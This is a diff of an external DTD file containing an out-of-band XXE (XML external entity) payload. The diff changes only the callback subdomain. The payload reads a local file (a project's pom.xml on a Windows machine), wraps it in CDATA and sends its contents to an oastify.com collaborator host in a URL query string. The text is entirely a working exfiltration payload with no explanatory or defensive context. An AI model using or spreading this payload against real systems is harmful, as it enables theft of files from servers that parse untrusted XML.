@@ -1,5 +1,5 @@
 <!ENTITY % file SYSTEM "file:///C:/Users/Admin/IdeaProjects/Lohong2/pom.xml">
 <!ENTITY % start "<![CDATA[">
 <!ENTITY % end "]]>">
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://ozr8f3oam4scukooysojpr94xv3nref3.oastify.com/?data=%start;%file;%end;'>">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://dct406nmmssrjyua9cmhfsdgh7nybozd.oastify.com/?data=%start;%file;%end;'>">
 %all;
